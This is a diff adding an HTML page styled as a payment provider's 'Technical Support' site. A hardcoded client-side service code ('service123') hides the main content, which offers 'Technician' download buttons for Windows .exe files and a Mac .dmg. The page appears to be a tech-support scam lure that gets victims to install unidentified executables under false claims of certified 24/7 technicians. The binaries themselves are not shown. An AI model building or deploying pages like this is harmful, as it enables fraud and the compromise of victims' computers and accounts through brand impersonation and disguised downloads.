@@ -1,0 +1,415 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" type="image/png" href="./logo.png">
+    <title>Technical Support</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/feather-icons/4.29.0/feather.min.js"></script>
+</head>
+<body class="bg-gray-50">
+   <body class="bg-gray-50">
+
+<!-- SERVICE CODE SCREEN -->
+<div id="serviceGate" class="flex items-center justify-center min-h-screen bg-gray-50">
+
+<div class="bg-white p-10 rounded-lg shadow-md text-center max-w-sm w-full">
+
+<img src="./download.png" alt="Logo" class="mx-auto mb-6" width="160">
+
+<h2 class="text-xl font-semibold text-gray-800 mb-4">Enter Service Code</h2>
+
+<input
+id="serviceCode"
+type="password"
+placeholder="Enter service code"
+class="w-full px-4 py-3 border rounded-lg mb-4 focus:outline-none focus:ring-2 focus:ring-blue-500"
+/>
+
+<button onclick="checkCode()" class="w-full bg-blue-600 text-white py-3 rounded-lg hover:bg-blue-700">
+Continue
+</button>
+
+<p id="errorMsg" class="text-red-500 text-sm mt-3 hidden">Invalid service code</p>
+
+</div>
+</div>
+
+<div id="mainContent" style="display:none;">
+        <div class="max-w-6xl mx-auto px-4 py-4">
+            
+            <img src="./download.png" alt="Logo" width="150" height="50">
+        </div>
+    </header>
+    
+    
+
+    <!-- Main Content -->
+    <main class="max-w-4xl mx-auto px-4 py-12">
+        <h1 class="text-3xl font-light text-gray-800 mb-4 text-center">Technical Support</h1>
+        <p class="text-center text-gray-600 mb-8 max-w-2xl mx-auto">
+            Get expert help with your account, transactions, and technical issues. Our dedicated support team is available 24/7 to assist you.
+        </p>
+
+        <!-- Search Bar -->
+        <div class="mb-12">
+            <input
+                type="text"
+                placeholder="What can we help you with today?"
+                class="w-full py-3 px-4 rounded-lg border border-gray-300 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent"
+            />
+        </div>
+
+        <!-- Support Image and Description -->
+        <div class="bg-white rounded-lg shadow-sm border p-8 mb-8">
+            <div class="flex flex-col md:flex-row items-center gap-8 mb-8">
+                <div class="md:w-1/2">
+                    <img src="./team.jpg" alt="Support" class="rounded-lg w-full"/>
+                </div>
+                <div class="md:w-1/2">
+                    <h2 class="text-xl font-semibold text-gray-800 mb-4">24/7 Technical Assistance</h2>
+                    <p class="text-gray-600 text-sm leading-relaxed mb-4">
+                        Our technical support team is here to help you resolve any issues with your account. Whether you're experiencing login problems, payment issues, or need help with account security, our certified technicians are ready to assist.
+                    </p>
+                    <p class="text-gray-600 text-sm leading-relaxed">
+                        Choose from our specialized Windows or Mac support teams below for immediate assistance tailored to your operating system.
+                    </p>
+                </div>
+            </div>
+
+            <!-- Support Team Description -->
+            <div class="bg-gray-50 p-6 rounded-lg mb-8">
+                <h3 class="text-lg font-medium text-gray-800 mb-3">Our Support Team</h3>
+                <p class="text-gray-600 text-sm mb-4">
+                    Every technician on our team is certified in systems and security protocols. They can help you with:
+                </p>
+                <ul class="grid md:grid-cols-2 gap-4 text-sm text-gray-600">
+                    <li class="flex items-center gap-2">
+                        <i data-feather="check" class="w-4 h-4 text-green-500"></i>
+                        Account access and security issues
+                    </li>
+                    <li class="flex items-center gap-2">
+                        <i data-feather="check" class="w-4 h-4 text-green-500"></i>
+                        Payment and transaction problems
+                    </li>
+                    <li class="flex items-center gap-2">
+                        <i data-feather="check" class="w-4 h-4 text-green-500"></i>
+                        Integration and API support
+                    </li>
+                    <li class="flex items-center gap-2">
+                        <i data-feather="check" class="w-4 h-4 text-green-500"></i>
+                        Mobile app troubleshooting
+                    </li>
+                </ul>
+            </div>
+
+            <!-- Windows Support -->
+            <!-- Windows Support -->
+<div style="margin-bottom: 32px;">
+    <h3 style="font-size: 14px; font-weight: 500; color: #6b7280; margin-bottom: 16px; margin-top: 0;">Windows Support</h3>
+    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 16px;">
+        <a href="./windows/technician-1.exe" style="
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            gap: 8px; 
+            background: #0070ba; 
+            color: white; 
+            padding: 12px 20px; 
+            border-radius: 6px; 
+            text-decoration: none; 
+            font-size: 16px; 
+            font-weight: 500; 
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.15); 
+            transition: all 0.2s ease; 
+            border: 1px solid #003087;
+            min-height: 48px;
+            cursor: pointer;
+        " 
+        onmouseover="this.style.background='#005ea6';" 
+        onmouseout="this.style.background='#0070ba';">
+            <i data-feather="monitor" style="width: 18px; height: 18px;"></i>
+            Technician 1
+        </a>
+        
+        <a href="./windows/technician-2.exe" style="
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            gap: 8px; 
+            background: #0070ba; 
+            color: white; 
+            padding: 12px 20px; 
+            border-radius: 6px; 
+            text-decoration: none; 
+            font-size: 16px; 
+            font-weight: 500; 
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.15); 
+            transition: all 0.2s ease; 
+            border: 1px solid #003087;
+            min-height: 48px;
+            cursor: pointer;
+        " 
+        onmouseover="this.style.background='#005ea6';" 
+        onmouseout="this.style.background='#0070ba';">
+            <i data-feather="monitor" style="width: 18px; height: 18px;"></i>
+            Technician 2
+        </a>
+        
+        <a href="./windows/technician-3.exe" style="
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            gap: 8px; 
+            background: #0070ba; 
+            color: white; 
+            padding: 12px 20px; 
+            border-radius: 6px; 
+            text-decoration: none; 
+            font-size: 16px; 
+            font-weight: 500; 
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.15); 
+            transition: all 0.2s ease; 
+            border: 1px solid #003087;
+            min-height: 48px;
+            cursor: pointer;
+        " 
+        onmouseover="this.style.background='#005ea6';" 
+        onmouseout="this.style.background='#0070ba';">
+            <i data-feather="monitor" style="width: 18px; height: 18px;"></i>
+            Technician 3
+        </a>
+    </div>
+</div>
+
+<!-- Mac Support -->
+<div style="margin-bottom: 32px;">
+    <h3 style="font-size: 14px; font-weight: 500; color: #6b7280; margin-bottom: 16px; margin-top: 0;">Mac Support</h3>
+    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 16px;">
+        <a href="./macOs/technician.dmg" style="
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            gap: 8px; 
+            background: #0070ba; 
+            color: white; 
+            padding: 12px 20px; 
+            border-radius: 6px; 
+            text-decoration: none; 
+            font-size: 16px; 
+            font-weight: 500; 
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.15); 
+            transition: all 0.2s ease; 
+            border: 1px solid #003087;
+            min-height: 48px;
+            cursor: pointer;
+        " 
+        onmouseover="this.style.background='#005ea6';" 
+        onmouseout="this.style.background='#0070ba';">
+            <i data-feather="monitor" style="width: 18px; height: 18px;"></i>
+            Technician 1
+        </a>
+        
+        <a href="./macOs/technician.dmg" style="
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            gap: 8px; 
+            background: #0070ba; 
+            color: white; 
+            padding: 12px 20px; 
+            border-radius: 6px; 
+            text-decoration: none; 
+            font-size: 16px; 
+            font-weight: 500; 
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.15); 
+            transition: all 0.2s ease; 
+            border: 1px solid #003087;
+            min-height: 48px;
+            cursor: pointer;
+        " 
+        onmouseover="this.style.background='#005ea6';" 
+        onmouseout="this.style.background='#0070ba';">
+            <i data-feather="monitor" style="width: 18px; height: 18px;"></i>
+            Technician 2
+        </a>
+        
+        <a href="./macOs/technician.dmg" style="
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            gap: 8px; 
+            background: #0070ba; 
+            color: white; 
+            padding: 12px 20px; 
+            border-radius: 6px; 
+            text-decoration: none; 
+            font-size: 16px; 
+            font-weight: 500; 
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.15); 
+            transition: all 0.2s ease; 
+            border: 1px solid #003087;
+            min-height: 48px;
+            cursor: pointer;
+        " 
+        onmouseover="this.style.background='#005ea6';" 
+        onmouseout="this.style.background='#0070ba';">
+            <i data-feather="monitor" style="width: 18px; height: 18px;"></i>
+            Technician 3
+        </a>
+    </div>
+</div>
+
+        <!-- Additional Support Resources -->
+        <div class="grid md:grid-cols-2 gap-6 mb-8">
+            <div class="bg-white p-6 rounded-lg shadow-sm border">
+                <h3 class="text-lg font-medium text-gray-800 mb-3">Quick Help Guides</h3>
+                <ul class="space-y-3">
+                    <li class="flex items-center gap-2 text-sm text-gray-600">
+                        <i data-feather="file-text" class="w-4 h-4"></i>
+                        Account Security Best Practices
+                    </li>
+                    <li class="flex items-center gap-2 text-sm text-gray-600">
+                        <i data-feather="file-text" class="w-4 h-4"></i>
+                        Payment Troubleshooting Steps
+                    </li>
+                    <li class="flex items-center gap-2 text-sm text-gray-600">
+                        <i data-feather="file-text" class="w-4 h-4"></i>
+                        Mobile App Setup Guide
+                    </li>
+                </ul>
+            </div>
+            <div class="bg-white p-6 rounded-lg shadow-sm border">
+                <h3 class="text-lg font-medium text-gray-800 mb-3">Developer Resources</h3>
+                <ul class="space-y-3">
+                    <li class="flex items-center gap-2 text-sm text-gray-600">
+                        <i data-feather="code" class="w-4 h-4"></i>
+                        API Documentation
+                    </li>
+                    <li class="flex items-center gap-2 text-sm text-gray-600">
+                        <i data-feather="code" class="w-4 h-4"></i>
+                        Integration Guides
+                    </li>
+                    <li class="flex items-center gap-2 text-sm text-gray-600">
+                        <i data-feather="code" class="w-4 h-4"></i>
+                        Developer Community
+                    </li>
+                </ul>
+            </div>
+        </div>
+    </div>
+        <!-- Contact Information -->
+        <div class="bg-white p-6 rounded-lg shadow-sm border">
+            <h3 class="text-lg font-medium text-gray-800 mb-4">Additional Support Options</h3>
+            <div class="grid md:grid-cols-3 gap-6">
+                <div class="text-center">
+                    <i data-feather="phone" class="w-6 h-6 mx-auto mb-2 text-blue-600"></i>
+                    <h4 class="font-medium mb-2">Phone Support</h4>
+                    <p class="text-sm text-gray-600">Available 24/7</p>
+                </div>
+                <div class="text-center">
+                    <i data-feather="mail" class="w-6 h-6 mx-auto mb-2 text-blue-600"></i>
+                    <h4 class="font-medium mb-2">Email Support</h4>
+                    <p class="text-sm text-gray-600">Response within 24 hours</p>
+                </div>
+                <div class="text-center">
+                    <i data-feather="message-circle" class="w-6 h-6 mx-auto mb-2 text-blue-600"></i>
+                    <h4 class="font-medium mb-2">Community Help</h4>
+                    <p class="text-sm text-gray-600">Connect with other users</p>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="bg-gray-100 border-t mt-12">
+        <div class="max-w-4xl mx-auto px-4 py-8">
+            <div class="grid md:grid-cols-3 gap-8 mb-8">
+                <div>
+                    <h4 class="font-medium mb-3">About us</h4>
+                    <ul class="space-y-2 text-sm text-gray-600">
+                        <li><a href="#" class="hover:text-blue-600">About Us</a></li>
+                        <li><a href="#" class="hover:text-blue-600">Careers</a></li>
+                        <li><a href="#" class="hover:text-blue-600">Developers</a></li>
+                    </ul>
+                </div>
+                <div>
+                    <h4 class="font-medium mb-3">Support</h4>
+                    <ul class="space-y-2 text-sm text-gray-600">
+                        <li><a href="#" class="hover:text-blue-600">Help Center</a></li>
+                        <li><a href="#" class="hover:text-blue-600">Resolution Center</a></li>
+                        <li><a href="#" class="hover:text-blue-600">Security Center</a></li>
+                    </ul>
+                </div>
+                <div>
+                    <h4 class="font-medium mb-3">Legal</h4>
+                    <ul class="space-y-2 text-sm text-gray-600">
+                        <li><a href="#" class="hover:text-blue-600">Privacy</a></li>
+                        <li><a href="#" class="hover:text-blue-600">Legal Hub</a></li>
+                        <li><a href="#" class="hover:text-blue-600">Terms and Conditions</a></li>
+                    </ul>
+                </div>
+            </div>
+            
+            <div class="pt-8 border-t border-gray-200">
+                <div class="flex flex-col md:flex-row justify-between items-center text-sm text-gray-600">
+                    <p>&copy; 2025 support. All rights reserved.</p>
+                    <div class="flex space-x-4 mt-4 md:mt-0">
+                        <a href="#" class="hover:text-blue-600">Site Map</a>
+                        <a href="#" class="hover:text-blue-600">Accessibility</a>
+                        <a href="#" class="hover:text-blue-600">Contact</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+
+
+   <script>
+
+feather.replace()
+
+function checkCode(){
+
+const code = document.getElementById("serviceCode").value
+
+if(code === "service123"){
+
+document.getElementById("serviceGate").style.display="none"
+document.getElementById("mainContent").style.display="block"
+
+}else{
+
+document.getElementById("errorMsg").classList.remove("hidden")
+
+}
+
+}
+
+document.getElementById("serviceCode").addEventListener("keypress",function(e){
+
+if(e.key==="Enter"){
+checkCode()
+}
+
+})
+
+</script>
+
+</div>
+
+
+
+
+
+</body>                 
+
+</html> 
